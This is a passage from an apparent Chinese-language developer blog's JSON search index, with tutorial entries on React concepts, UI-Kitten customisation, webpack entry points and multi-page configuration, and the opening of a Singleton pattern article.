setPassword(event.currentTarget.value)} value={password} /\u0026gt; \u0026lt;SubmitButton\u0026gt;Login\u0026lt;/SubmitButton\u0026gt; \u0026lt;/LoginForm\u0026gt; ); };   Props vs State 道具和状态有时会相互混淆，因为它们非常相似。 以下是它们之间的一些主要区别：\n   Props State     组件之间的数据保持不变 数据是存储在组件的 Props 中的数据的当前快照。 它在组件的生命周期内发生变化   数据是只读的 数据可以是异步的   props中的数据不可修改 可以使用 this.setState 修改 state 中的数据   props 是传递给组件的东西 State 在组件内管理    \rReact 中的其他概念 组件、道具和状态是你在 React 中所做的一切的三个关键概念。 但还有其他概念需要学习：\n1. 生命周期 每个React组件都经过三个阶段：安装、渲染和拆卸。 在这三个阶段发生的一系列事件可以称为组件的生命周期。\n虽然这些事件部分与组件的状态（其内部数据）相关，但生命周期略有不同。 React 具有根据需要加载和卸载组件的内部代码，并且组件可以存在于该内部代码中的多个使用阶段。\n生命周期方法有很多，但最常见的是：\n render() - 这个方法是 React 中类组件中唯一需要的方法，也是最常用的方法。 顾名思义，它负责处理组件到 UI 的渲染，它发生在组件的安装和渲染过程中。  创建或删除组件时：\n  componentDidMount() 在组件输出渲染到 DOM 后运行\n  在卸载和销毁组件之前立即调用 componentWillUnmount()\n  当 props 或 state 更新时：\n  当接收到新的 props 或 state 时， shouldComponentUpdate() 在渲染之前被调用。\n  componentDidUpdate() 在更新发生后立即调用。 初始渲染不会调用此方法。\n  2. HOC 高阶组件 Higher-order component (HOC) 是 React 中用于重用组件逻辑的高级技术。\n意思是高阶组件是一个函数，它接受一个组件并返回一个新组件。\n它们是从 React 的组合性质中出现的模式。 组件将 props 转换为 UI，而高阶组件将一个组件转换为另一个组件，它们往往在第三方库中流行。\n3. Context 在典型的 React 应用程序中，数据通过 props 传递，但这对于应用程序中的许多组件所需的某些类型的 props 来说可能很麻烦。\nContext 提供了一种在组件之间共享这些类型的数据的方法，而无需显式地通过每个层次结构级别传递 prop。\n意思是上下文，我们可以避免通过中间元素传递道具。\n\rReact Hooks Hooks 是让你从功能组件“钩入”React 状态和生命周期特性的函数。\n它们让您无需编写类即可使用状态和其他 React 功能。\n\r在 React 中思考 ✔ React 真正令人惊奇的一件事是它如何让您在构建应用程序时思考它们。\n使用 React Hooks 构建可搜索产品数据表的思考过程。\n第 1 步：从 模拟 开始想象一下 有一个 JSON API 和一个模拟界面：\nJSON API 返回一些如下所示的数据：\n[\r{category: \u0026#34;Entertainment\u0026#34;, retweets: \u0026#34;54\u0026#34;, isLocal: false, text: \u0026#34;Omg. A tweet.\u0026#34;},\r{category: \u0026#34;Entertainment\u0026#34;, retweets: \u0026#34;100\u0026#34;, isLocal: false, text: \u0026#34;Omg. Another.\u0026#34;},\r{category: \u0026#34;Technology\u0026#34;, retweets: \u0026#34;32\u0026#34;, isLocal: false, text: \u0026#34;New ECMAScript features!\u0026#34;},\r{category: \u0026#34;Technology\u0026#34;, retweets: \u0026#34;88\u0026#34;, isLocal: true, text: \u0026#34;Wow, learning React!\u0026#34;}\r]; 提示：像 Excalidraw 这样的免费工具可用于绘制 UI 和组件的高级模拟。\n第 2 步：将 UI 分解为层次结构组件 有了模拟后，接下来要做的是在模拟中的每个组件（和子组件）周围绘制框，并命名所有这些框，如下所示。\n使用单一职责原则：理想情况下，组件应该具有单一功能。 如果它最终增长，则应将其分解为更小的子组件。 使用相同的技术来决定是否应该创建新函数或对象。\n上图中看到应用程序中有五个组件。 已经列出了每个组件代表的数据。\n TweetSearchResults（橙色）：完整组件的容器 SearchBar（蓝色）：用户输入要搜索的内容 TweetList（绿色）：根据用户输入显示和过滤推文 TweetCategory（绿松石色）：显示每个类别的标题 TweetRow（红色）：为每条推文显示一行  既然已经确定了模拟中的组件，接下来要做的就是将它们分类到一个层次结构中。\n在模拟中的另一个组件中找到的组件应显示为层次结构中的子组件。\n像这样：\n\r- TweetSearchResults\r- SearchBar\r- TweetList\r- TweetCategory\r- TweetRow\r\r第 3 步：实现应用程序。 在去年之前，最快的方法是构建一个版本，该版本接受数据模型并呈现 UI 但具有零交互性，\n但是自从引入 React Hooks 以来，实现应用程序的更简单方法是使用 Hooks，如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105  // i. TweetSearchResults const TweetSearchResults = ({tweets}) =\u0026gt; { const [filterText, setFilterText] = useState(\u0026#39;\u0026#39;); const [inThisLocation, setInThisLocation] = useState(false); return ( \u0026lt;div\u0026gt; \u0026lt;SearchBar filterText={filterText} inThisLocation={inThisLocation} setFilterText={setFilterText} setInThisLocation={setInThisLocation} /\u0026gt; \u0026lt;TweetList tweets={tweets} filterText={filterText} inThisLocation={inThisLocation} /\u0026gt; \u0026lt;/div\u0026gt; ); } // ii. SearchBar const SearchBar = ({filterText, inThisLocation, setFilterText, setInThisLocation}) =\u0026gt; ( \u0026lt;form\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; placeholder=\u0026#34;Search...\u0026#34; value={filterText} onChange={(e) =\u0026gt; setFilterText(e.target.value)} /\u0026gt; \u0026lt;p\u0026gt; \u0026lt;label\u0026gt; \u0026lt;input type=\u0026#34;checkbox\u0026#34; checked={inThisLocation} onChange={(e) =\u0026gt; setInThisLocation(e.target.checked)} /\u0026gt; {\u0026#39; \u0026#39;} Only show tweets in your current location \u0026lt;/label\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/form\u0026gt; ); // iii. TweetList const TweetList = ({tweets, filterText, inThisLocation}) =\u0026gt; { const rows = []; let lastCategory = null; tweets.forEach((tweet) =\u0026gt; { if (tweet.text.toLowerCase().indexOf(filterText.toLowerCase()) === -1) { return; } if (inThisLocation \u0026amp;\u0026amp; !tweet.isLocal) { return; } if (tweet.category !== lastCategory) { rows.push( \u0026lt;TweetCategory category={tweet.category} key={tweet.category} /\u0026gt; ); } rows.push( \u0026lt;TweetRow tweet={tweet} key={tweet.text} /\u0026gt; ); lastCategory = tweet.category; }); return ( \u0026lt;table\u0026gt; \u0026lt;thead\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th\u0026gt;Tweet Text\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;Retweets\u0026lt;/th\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/thead\u0026gt; \u0026lt;tbody\u0026gt;{rows}\u0026lt;/tbody\u0026gt; \u0026lt;/table\u0026gt; ); } // iv. TweetCategory const TweetCategory = ({category}) =\u0026gt; ( \u0026lt;tr\u0026gt; \u0026lt;th colSpan=\u0026#34;2\u0026#34;\u0026gt; {category} \u0026lt;/th\u0026gt; \u0026lt;/tr\u0026gt; ); // v. TweetRow const TweetRow = ({tweet}) =\u0026gt; { const color = tweet.isLocal ? \u0026#39;inherit\u0026#39; : \u0026#39;red\u0026#39;; return ( \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;\u0026lt;span style=\u0026#34;\u0026#34;\u0026gt;{tweet.text}\u0026lt;/span\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;{tweet.retweets}\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; ); }   最终的实现将是按照前面所述的层次结构一起编写的所有代码：\n\r- TweetSearchResults\r- SearchBar\r- TweetList\r- TweetCategory\r- TweetRow\r\r\r开始 React 的方式 有多种方法可以开始使用 React。\n  直接在网页上加载：这是设置 React 的最简单方法。 将 React JavaScript 添加到您的页面，作为 npm 依赖项或通过 CDN。\n  使用 create-react-app：create-react-app 是一个旨在快使用 React 的项目，任何需要超出单个页面的 React 应用程序都会发现 create-react-app 非常符合这个需求 容易地。\n  更严肃的生产应用程序应该考虑使用 Next.js，因为它具有更强大的默认值（如代码拆分）。\n  代码沙盒：无需安装即可获得 create-react-app 结构的一种简单方法是访问 https://codesandbox.io/s 并选择“React”。\n  Codepen：如果对 React 组件进行原型设计并喜欢使用 Codepen 那么也可以。\n  \r结论 React.js 库旨在使构建模块化、可重用用户界面组件的过程变得简单直观。\n当阅读一些其他指南时，会发现这个简短的介绍是一个有用的高级概述。\n\r知识点  React ReactDOM JSX Redux Hooks ReactNative Webpack CRA Next.js  ","description":"用于构建可重用用户界面组件的 UI 库","id":43,"section":"react-patterns","tags":null,"title":"React.js 概述","uri":"https://codthing.github.io/react-patterns/render-patterns/overview-react/"},{"content":"一、DrawerGroup （UI-Kitten ） DrawerGroup 导航问题 xxx 这个问题没有解决\n UI-Kitten Version@5.0.0\n@ui-kitten/components DrawerGroup\n const DrawerContent = ({ navigation, state }) =\u0026gt; {\rconst routes = [//1.定义对应的组件（组件名而非title名）数组\r[\u0026#39;Users\u0026#39;],\r[\u0026#39;Orders\u0026#39;],\r[\u0026#39;EvaDesign\u0026#39;, \u0026#39;News\u0026#39;, \u0026#39;Details\u0026#39;]\r];\rconst [selectedIndex, setSelectedIndex] = React.useState(new IndexPath(0));//2.初始化选中状态\rreturn (\r//3.以index作为判断依据实现导航条件\r\u0026lt;Drawer\rselectedIndex={selectedIndex}\ronSelect={index =\u0026gt; {\rsetSelectedIndex(index)\rif (index.section != undefined) {\rlet sectionRoute = routes[index.section][index.row];\rnavigation.navigate(sectionRoute);\r} else if (index.section == undefined) {\rnavigation.navigate(state.routeNames[index.row])\r}\r}}\r\u0026gt;\r\u0026lt;DrawerItem title=\u0026#39;Users\u0026#39;/\u0026gt;\r\u0026lt;DrawerItem title=\u0026#39;Orders\u0026#39;/\u0026gt;\r\u0026lt;DrawerGroup title=\u0026#39;AkveoDesign\u0026#39;\u0026gt;\r\u0026lt;DrawerItem title=\u0026#39;EvaDesign\u0026#39;/\u0026gt;\r\u0026lt;DrawerItem title=\u0026#39;News\u0026#39;/\u0026gt;\r\u0026lt;DrawerItem title=\u0026#39;Details\u0026#39;/\u0026gt;\r\u0026lt;/DrawerGroup\u0026gt;\r\u0026lt;/Drawer\u0026gt;\r)\r}; 二、自定义映射（UI-Kitten） Step.1 创建映射\n工程根目录新建 mapping.json 文件，\n该配置文件稍后由Eva设计系统处理器处理，以提供组件所应用的最终样式。\n//文本text样式\r{\r\u0026#34;strict\u0026#34;: {\r\u0026#34;text-font-family\u0026#34;: \u0026#34;OpenSans-Regular\u0026#34;,\r\u0026#34;text-heading-1-font-size\u0026#34;: 36,\r\u0026#34;text-heading-1-font-weight\u0026#34;: \u0026#34;800\u0026#34;,\r\u0026#34;text-heading-1-font-family\u0026#34;: \u0026#34;OpenSans-Bold\u0026#34;,\r// Same for `h2...h6`\r\u0026#34;text-subtitle-1-font-size\u0026#34;: 15,\r\u0026#34;text-subtitle-1-font-weight\u0026#34;: \u0026#34;600\u0026#34;,\r\u0026#34;text-subtitle-1-font-family\u0026#34;: \u0026#34;OpenSans-SemiBold\u0026#34;,\r// Same for `s2`\r\u0026#34;text-paragraph-1-font-size\u0026#34;: 15,\r\u0026#34;text-paragraph-1-font-weight\u0026#34;: \u0026#34;400\u0026#34;,\r\u0026#34;text-paragraph-1-font-family\u0026#34;: \u0026#34;OpenSans-Regular\u0026#34;,\r// Same for `p2`\r\u0026#34;text-caption-1-font-size\u0026#34;: 12,\r\u0026#34;text-caption-1-font-weight\u0026#34;: \u0026#34;400\u0026#34;,\r\u0026#34;text-caption-1-font-family\u0026#34;: \u0026#34;OpenSans-Regular\u0026#34;,\r// Same for `c2`\r\u0026#34;text-label-font-size\u0026#34;: 12,\r\u0026#34;text-label-font-weight\u0026#34;: \u0026#34;800\u0026#34;,\r\u0026#34;text-label-font-family\u0026#34;: \u0026#34;OpenSans-Bold\u0026#34;\r}\r} step.2 更改单个参数\n为了更改默认参数，您需要找出它的声明位置（/node_modules/@eva-design/eva/mapping.json）。为此，我们可以快速浏览有关组件的元信息。\n//文本text样式\r{\r\u0026#34;strict\u0026#34;: {\r\u0026#34;text-font-family\u0026#34;: \u0026#34;OpenSans-Regular\u0026#34;,\r- \u0026#34;text-heading-1-font-size\u0026#34;: 36,\r+ \u0026#34;text-heading-1-font-size\u0026#34;: 66, step.3 实现映射\n metro.config.js中配置以下代码：\n const MetroConfig = require(\u0026#39;@ui-kitten/metro-config\u0026#39;);\rconst evaConfig = {\revaPackage: \u0026#39;@eva-design/eva\u0026#39;,\r++ customMappingPath: \u0026#39;./path-to/mapping.json\u0026#39;,\r};\rmodule.exports = MetroConfig.create(evaConfig, {\r// Whatever was previously specified\r}); 三、主题定制（UI-Kitten） Step.1 Eva-Color\nEva-color中自定义配置颜色，export theme.json文件，放入工程中。\nStep.2 App.js\nimport React from \u0026#39;react\u0026#39;;\rimport * as eva from \u0026#39;@eva-design/eva\u0026#39;;\rimport { ApplicationProvider, Layout, Button } from \u0026#39;@ui-kitten/components\u0026#39;;\rimport { default as theme } from \u0026#39;./theme.json\u0026#39;; // \u0026lt;-- Import app theme\rexport default () =\u0026gt; (\r\u0026lt;ApplicationProvider {...eva} theme={{ ...eva.dark, ...theme }}\u0026gt;\r\u0026lt;Layout style={{ flex: 1, justifyContent: \u0026#39;center\u0026#39;, alignItems: \u0026#39;center\u0026#39; }}\u0026gt;\r\u0026lt;Button\u0026gt;HOME\u0026lt;/Button\u0026gt;\r\u0026lt;/Layout\u0026gt;\r\u0026lt;/ApplicationProvider\u0026gt;\r); 四、使用第三方图标包（UI-Kitten） Step.1 安装 vector-icons\nnpm install --save react-native-vector-icons Step.2 配置（android）\n// android/app/build.gradle文件中添加\rapply from: \u0026#34;../../node_modules/react-native-vector-icons/fonts.gradle\u0026#34; Step.3 创建图标适配器\n// 创建一个feather-icons.js文件，并在其中放置以下代码。\rimport React from \u0026#39;react\u0026#39;;\rimport { StyleSheet } from \u0026#39;react-native\u0026#39;;\rimport Icon from \u0026#39;react-native-vector-icons/Feather\u0026#39;;\rexport const FeatherIconsPack = {\rname: \u0026#39;feather\u0026#39;,\ricons: createIconsMap(),\r};\rfunction createIconsMap() {\rreturn new Proxy({}, {\rget(target, name) {\rreturn IconProvider(name);\r},\r});\r}\rconst IconProvider = (name) =\u0026gt; ({\rtoReactElement: (props) =\u0026gt; FeatherIcon({ name, ...props }),\r});\rfunction FeatherIcon({ name, style }) {\rconst { height, tintColor, ...iconStyle } = StyleSheet.flatten(style);\rreturn (\r\u0026lt;Icon name={name} size={height} color={tintColor} style={iconStyle} /\u0026gt;\r);\r} Step.4 注册图标\nimport React from \u0026#39;react\u0026#39;;\rimport * as eva from \u0026#39;@eva-design/eva\u0026#39;;\rimport { ApplicationProvider, IconRegistry, Layout, Text } from \u0026#39;@ui-kitten/components\u0026#39;;\r++ import { FeatherIconsPack } from \u0026#39;./feather-icons\u0026#39;;\rconst HomeScreen = () =\u0026gt; (\r\u0026lt;Layout style={{flex: 1, justifyContent: \u0026#39;center\u0026#39;, alignItems: \u0026#39;center\u0026#39;}}\u0026gt;\r\u0026lt;Text category=\u0026#39;h1\u0026#39;\u0026gt;HOME\u0026lt;/Text\u0026gt;\r\u0026lt;/Layout\u0026gt;\r);\rexport default () =\u0026gt; (\r\u0026lt;\u0026gt;\r++ \u0026lt;IconRegistry icons={FeatherIconsPack} /\u0026gt;\r\u0026lt;ApplicationProvider {...eva} theme={eva.light}\u0026gt;\r\u0026lt;HomeScreen /\u0026gt;\r\u0026lt;/ApplicationProvider\u0026gt;\r\u0026lt;/\u0026gt;\r); Step.5 使用\nimport React from \u0026#39;react\u0026#39;;\rimport { Button, Icon } from \u0026#39;@ui-kitten/components\u0026#39;;\rexport const FacebookIcon = (props) =\u0026gt; (\r\u0026lt;Icon name=\u0026#39;facebook\u0026#39; {...props} /\u0026gt;\r);\rexport const LoginButton = () =\u0026gt; (\r\u0026lt;Button accessoryLeft={FacebookIcon}\u0026gt;Login with Facebook\u0026lt;/Button\u0026gt;\r); 五、Expo\u0026amp;UI-Kitten（web端报错的问题） 解决办法：\n//1.安装\rexpo install @expo/webpack-config\r//2.根目录新建`webpack.config.js`添加\rconst createExpoWebpackConfigAsync = require(\u0026#39;@expo/webpack-config\u0026#39;);\rmodule.exports = async function(env, argv) {\rconst config = await createExpoWebpackConfigAsync({\r...env,\rbabel: {\rdangerouslyAddModulePathsToTranspile: [\u0026#39;@ui-kitten/components\u0026#39;]\r}\r}, argv);\rreturn config;\r}; ","description":"","id":44,"section":"react-native","tags":null,"title":"UI-Kitten 最佳实践","uri":"https://codthing.github.io/react-native/ui/ui-kitten/kitten-bp/"},{"content":"一、入口 （entry） #.单个入口（简写/数组）语法   用法：entry: string | [string]\n  优缺点：通过一个入口（例如一个库）为应用程序设置 webpack 配置时，单一入口是不错的选择。然而，这种语法扩展配置的灵活性不大。\n   webpack.config.js\n module.exports = {\rentry: { main: \u0026#39;./path/to/my/entry/file.js\u0026#39; } }\r// 或者，注入多个依赖文件，并将依赖关系绘制在一个“chunk”中\rmodule.exports = {\rentry: [\u0026#39;./src/file_1.js\u0026#39;,\u0026#39;./src/file_2.js\u0026#39;],\routput: {\rfilename: \u0026#39;bundle.js\u0026#39;\r}\r} #.对象语法 ✔   用法：entry: { string | [string] } | { }\n  优缺点：对象语法会比较繁琐。然而，这是应用程序中定义入口的最可扩展的方式。\n  对象属性：\n   dependOn: 当前入口所依赖的入口。必须在该入口被加载前被加载。 filename: 指定要输出的文件名称。 import: 启动时需加载的模块。 library: library 的相关选项。 runtime: 运行时 chunk 的名字。如果设置了，就会创建一个以这个名字命名的运行时 chunk，否则将使用现有的入口作为运行时。   注意事项：   runtime 和 dependOn 不能在同一个入口上同时使用 确保 runtime 不能指向已存在的入口名称 dependOn 不能循环引用  // ✔\rmodule.exports = {\rentry: {\rapp: \u0026#39;./src/app.js\u0026#39;,\radminApp: \u0026#39;./src/adminApp.js\u0026#39;,\r},\r};\r// ✔\rmodule.exports = {\rentry: {\ra2: \u0026#39;dependingfile.js\u0026#39;,\rb2: {\rdependOn: \u0026#39;a2\u0026#39;,\rimport: \u0026#39;./src/app.js\u0026#39;,\r},\r},\r};\r// × `runtime` 和 `dependOn` 不能在同一个入口上同时使用\rmodule.exports = {\rentry: {\ra2: \u0026#39;./a\u0026#39;,\rb2: {\rruntime: \u0026#39;x2\u0026#39;,\rdependOn: \u0026#39;a2\u0026#39;,\rimport: \u0026#39;./b\u0026#39;,\r},\r},\r};\r// × `runtime` 不能指向已存在的入口名称\rmodule.exports = {\rentry: {\ra1: \u0026#39;./a\u0026#39;,\rb1: {\rruntime: \u0026#39;a1\u0026#39;,\rimport: \u0026#39;./b\u0026#39;,\r},\r},\r};\r// × `dependOn` 不能循环引用\rmodule.exports = {\rentry: {\ra3: {\rimport: \u0026#39;./a\u0026#39;,\rdependOn: \u0026#39;b3\u0026#39;,\r},\rb3: {\rimport: \u0026#39;./b\u0026#39;,\rdependOn: \u0026#39;a3\u0026#39;,\r},\r},\r}; 二、常见场景 #.分离 app(应用程序) 和 vendor(第三方库) 入口 // 使用 optimization.splitChunks 默认配置\r// webpack.config.js\rmodule.exports = {\rentry: {\rmain: \u0026#39;./src/app.js\u0026#39;\r},\r//...\roptimization: {\rsplitChunks: {\rchunks: \u0026#39;async\u0026#39;,\rminSize: 20000,\rminRemainingSize: 0,\rmaxSize: 0,\rminChunks: 1,\rmaxAsyncRequests: 30,\rmaxInitialRequests: 30,\renforceSizeThreshold: 50000,\rcacheGroups: {\rdefaultVendors: {\rtest: /[\\\\/]node_modules[\\\\/]/,\rpriority: -10,\rreuseExistingChunk: true,\r},\rdefault: {\rminChunks: 2,\rpriority: -20,\rreuseExistingChunk: true,\r},\r},\r},\r},\r}; #.多页面应用程序 // webpack.config.js\rmodule.exports = {\rentry: {\rpageOne: \u0026#39;./src/pageOne/index.js\u0026#39;,\rpageTwo: \u0026#39;./src/pageTwo/index.js\u0026#39;,\rpageThree: \u0026#39;./src/pageThree/index.js\u0026#39;,\r},\r}; ","description":"","id":45,"section":"others","tags":null,"title":"webpack 基础","uri":"https://codthing.github.io/others/webpack/webpack-base/"},{"content":"静态网站，多个html页面（非SPA），WebPack配置 (基础篇)\nStep1. 初始化项目 mkdir multiple-htmlpages \u0026amp;\u0026amp; cd multiple-htmlpages\ryarn init\ryarn add -D webpack webpack-cli webpack-dev-server html-webpack-plugin\rmkdir src \u0026amp;\u0026amp; cd src\recho \u0026gt;index.html\recho \u0026gt;index.js //index.js中的内容保持空\r//index.html中添加内容\r\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt;\r\u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge\u0026#34;\u0026gt;\r\u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt;\r\u0026lt;title\u0026gt;首页\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;h1 class=\u0026#34;page-title\u0026#34;\u0026gt;首页\u0026lt;/h1\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt; Step2. 配置开发服务器  1.webpack.dev.js\n echo \u0026gt;webpack.dev.js //webpack.dev.js中添加内容\rconst HtmlWebpackPlugin = require(\u0026#39;html-webpack-plugin\u0026#39;);\rmodule.exports = {\r// https://webpack.js.org/concepts/entry-points/#multi-page-application\rentry: {\rindex: \u0026#39;./src/index.js\u0026#39;\r},\r// https://webpack.js.org/configuration/dev-server/\rdevServer: {\rport: 8080\r},\r// https://webpack.js.org/concepts/plugins/\rplugins: [\rnew HtmlWebpackPlugin({\rtemplate: \u0026#39;./src/index.html\u0026#39;,\rinject: true,\rchunks: [\u0026#39;index\u0026#39;],\rfilename: \u0026#39;index.html\u0026#39;\r})\r]\r};  package.json   {\r\u0026#34;name\u0026#34;: \u0026#34;multiple-htmlpages\u0026#34;,\r\u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;,\r\u0026#34;description\u0026#34;: \u0026#34;静态网站，多个html页面，WebPack配置\u0026#34;,\r\u0026#34;author\u0026#34;: \u0026#34;fungmo\u0026#34;,\r\u0026#34;license\u0026#34;: \u0026#34;MIT\u0026#34;,\r\u0026#34;scripts\u0026#34;: {\r\u0026#34;start\u0026#34;: \u0026#34;webpack serve --config webpack.dev.js --mode development\u0026#34;\r},\r\u0026#34;devDependencies\u0026#34;: {\r\u0026#34;html-webpack-plugin\u0026#34;: \u0026#34;^5.3.1\u0026#34;,\r\u0026#34;webpack\u0026#34;: \u0026#34;^5.30.0\u0026#34;,\r\u0026#34;webpack-cli\u0026#34;: \u0026#34;^4.6.0\u0026#34;,\r\u0026#34;webpack-dev-server\u0026#34;: \u0026#34;^3.11.2\u0026#34;\r} }  yarn start 启动服务器   Step3. 添加更多 HTML 页面 echo \u0026gt;about.html\recho \u0026gt;about.js\recho \u0026gt;contacts.html\recho \u0026gt;contacts.js const HtmlWebpackPlugin = require(\u0026#39;html-webpack-plugin\u0026#39;);\rmodule.exports = {\r// https://webpack.js.org/concepts/entry-points/#multi-page-application\rentry: {\rindex: \u0026#39;./src/index.js\u0026#39;,\rabout: \u0026#39;./src/about.js\u0026#39;,\rcontacts: \u0026#39;./src/contacts.js\u0026#39;\r},\r// https://webpack.js.org/configuration/dev-server/\rdevServer: {\rport: 8080\r},\r// https://webpack.js.org/concepts/plugins/\rplugins: [\rnew HtmlWebpackPlugin({\rtemplate: \u0026#39;./src/index.html\u0026#39;,\rinject: true,\rchunks: [\u0026#39;index\u0026#39;],\rfilename: \u0026#39;index.html\u0026#39;\r}),\rnew HtmlWebpackPlugin({\rtemplate: \u0026#39;./src/about.html\u0026#39;,\rinject: true,\rchunks: [\u0026#39;about\u0026#39;],\rfilename: \u0026#39;about.html\u0026#39;\r}),\rnew HtmlWebpackPlugin({\rtemplate: \u0026#39;./src/contacts.html\u0026#39;,\rinject: true,\rchunks: [\u0026#39;contacts\u0026#39;],\rfilename: \u0026#39;contacts.html\u0026#39;\r})\r]\r}; Step4. 添加CSS yarn add normalize.css //index.js、about.js、contacts.js 中，顶部添加\rimport \u0026#39;normalize.css/normalize.css\u0026#39;; yarn add -D css-loader style-loader //webpack.dev.js\rconst HtmlWebpackPlugin = require(\u0026#39;html-webpack-plugin\u0026#39;);\rmodule.exports = {\r...\rmodule: {\rrules: [\r{\rtest: /\\.css$/,\ruse: [\r\u0026#39;style-loader\u0026#39;,\r\u0026#39;css-loader\u0026#39;\r]\r}\r]\r}\r}; Step5. 使用最新的JavaScript语言 yarn add -D @babel/core babel-loader @babel/preset-env //webpack.dev.js\rconst HtmlWebpackPlugin = require(\u0026#39;html-webpack-plugin\u0026#39;);\rmodule.exports = {\r...\rmodule: {\rrules: [\r{\rtest: /\\.js$/,\rexclude: /node_modules/,\rloader: \u0026#39;babel-loader\u0026#39;,\roptions: {\rpresets: [\u0026#39;@babel/preset-env\u0026#39;]\r}\r},\r]\r}\r}; Step6. 生产发布  压缩css，js文件，因为字节很重要； 在压缩文件的名称上添加一个哈希，这样我们就可以配置服务器以为具有适当缓存头的服务器提供服务，并确信浏览器仍会获取新版本； 确保在html中使用了正确的文件名； 将生成的文件存储在配置的位置；   1.可以使用现有的 webpack.dev.js 并在内部进行配置，以区分生产和开发环境来执行上述任务。 但随后变得有点复杂且难以阅读。 因此，新建一个 webpack.prod.js 配置文件。 首先安装更多的依赖项来帮助我们进行压缩和优化：\n yarn add -D clean-webpack-plugin mini-css-extract-plugin optimize-css-assets-webpack-plugin http-server  2.配置 webpack.prod.js\n echo \u0026gt;webpack.prod.js // webpack.prod.js\rconst path = require(\u0026#39;path\u0026#39;);\rconst { CleanWebpackPlugin } = require(\u0026#39;clean-webpack-plugin\u0026#39;); const HtmlWebpackPlugin = require(\u0026#39;html-webpack-plugin\u0026#39;);\rconst MiniCssExtractPlugin = require(\u0026#34;mini-css-extract-plugin\u0026#34;);\rconst OptimizeCssAssetsPlugin = require(\u0026#39;optimize-css-assets-webpack-plugin\u0026#39;);\rconst buildPath = path.resolve(__dirname, \u0026#39;dist\u0026#39;);\rmodule.exports = {\r// This option controls if and how source maps are generated.\r// https://webpack.js.org/configuration/devtool/\rdevtool: \u0026#39;source-map\u0026#39;,\r// https://webpack.js.org/concepts/entry-points/#multi-page-application\rentry: {\rindex: \u0026#39;./src/index.js\u0026#39;,\rabout: \u0026#39;./src/about.js\u0026#39;,\rcontacts: \u0026#39;./src/contacts.js\u0026#39;\r},\r// how to write the compiled files to disk\r// https://webpack.js.org/concepts/output/\routput: {\rfilename: \u0026#39;[name].[hash:20].js\u0026#39;,\rpath: buildPath\r},\r// https://webpack.js.org/concepts/loaders/\rmodule: {\rrules: [\r{\rtest: /\\.js$/,\rexclude: /node_modules/,\rloader: \u0026#39;babel-loader\u0026#39;,\roptions: {\rpresets: [\u0026#39;@babel/preset-env\u0026#39;]\r}\r},\r{\rtest: /\\.css$/,\ruse: [\rMiniCssExtractPlugin.loader,\r\u0026#34;css-loader\u0026#34;\r]\r}\r]\r},\r// https://webpack.js.org/concepts/plugins/\rplugins: [\rnew CleanWebpackPlugin(),\rnew HtmlWebpackPlugin({\rtemplate: \u0026#39;./src/index.html\u0026#39;,\rinject: \u0026#39;body\u0026#39;,\rchunks: [\u0026#39;index\u0026#39;],\rfilename: \u0026#39;index.html\u0026#39;\r}),\rnew HtmlWebpackPlugin({\rtemplate: \u0026#39;./src/about.html\u0026#39;,\rinject: \u0026#39;body\u0026#39;,\rchunks: [\u0026#39;about\u0026#39;],\rfilename: \u0026#39;about.html\u0026#39;\r}),\rnew HtmlWebpackPlugin({\rtemplate: \u0026#39;./src/contacts.html\u0026#39;,\rinject: \u0026#39;body\u0026#39;,\rchunks: [\u0026#39;contacts\u0026#39;],\rfilename: \u0026#39;contacts.html\u0026#39;\r}),\rnew MiniCssExtractPlugin({\rfilename: \u0026#34;[name].[contenthash].css\u0026#34;,\rchunkFilename: \u0026#34;[id].[contenthash].css\u0026#34;\r})\r],\r// https://webpack.js.org/configuration/optimization/\roptimization: {\rminimize: true,\rminimizer: [\rnew OptimizeCssAssetsPlugin({})\r]\r}\r};  3.配置 package.json\n \u0026#34;scripts\u0026#34;: {\r\u0026#34;start\u0026#34;: \u0026#34;webpack serve --config webpack.dev.js --mode development\u0026#34;,\r\u0026#34;build\u0026#34;: \u0026#34;webpack --config webpack.prod.js --mode production\u0026#34;,\r\u0026#34;preview\u0026#34;: \u0026#34;yarn build \u0026amp;\u0026amp; http-server dist\u0026#34;\r},  4.要在本地构建和预览网站，请运行：\n yarn preview ","description":"","id":46,"section":"others","tags":null,"title":"webpack 实践","uri":"https://codthing.github.io/others/webpack/webpack-adv/"},{"content":"单例（统一用名词 Singleton 代替）是可以实例化一次的类，并且可以全局访问。单个实例可以在整个应用程序中共享，非常适合管理应用程序中的全局状态。\n\r计数器案例 构建一个Counter计数器具有以下内容的类：\n 返回实例值的 getInstance 方法 返回计数器变量当前值的 getCount 方法 将计数器的值 +1 的 increment 方法 将计数器的值 -1 的 decrement 方法  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  let counter = 0; class Counter { getInstance() { return this; } getCount() { return counter; } increment() { return ++counter; } decrement() { return --counter; } }   然而，这个类不符合 Singleton 的标准！ Singleton 应该只能被实例化一次。 上例可以创建 Counter 类的多个实例。可验证：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  let counter = 0; class Counter { getInstance() { return this; } getCount() { 